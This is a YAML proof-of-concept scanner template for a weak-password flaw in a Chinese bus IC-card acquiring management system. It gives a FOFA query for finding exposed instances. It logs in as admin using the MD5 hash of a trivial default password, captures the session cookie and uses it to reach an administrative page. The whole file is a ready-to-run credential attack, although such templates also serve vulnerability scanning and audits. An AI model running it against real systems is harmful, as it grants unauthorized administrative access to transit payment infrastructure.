id: poc-yaml-bus-ic-card-ams-weak-password
info:
  name: 公交IC卡收单管理系统 弱口令漏洞
  severity: medium
  tags:
  - 弱口令
  finger: 公交IC卡收单管理系统
  fofa: app="公交IC卡收单管理系统"
requests:
- method: POST
  path: /login
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: username=admin&password=e10adc3949ba59abbe56e057f20f883e
  expression: status_code == 200 && contains(body,`{"statusCode":0}`)
  output:
  - regex_match(headers,"JSESSIONID=(?P<cookie>.*?);")
- method: GET
  path: /html/organization.html
  headers:
    Cookie: JSESSIONID={{.cookie}}
  expression: status_code == 200 && contains(body,"部门管理") && contains(body,"系统设置")
    && contains(body,"登记部门")
variables: {}
transport: http
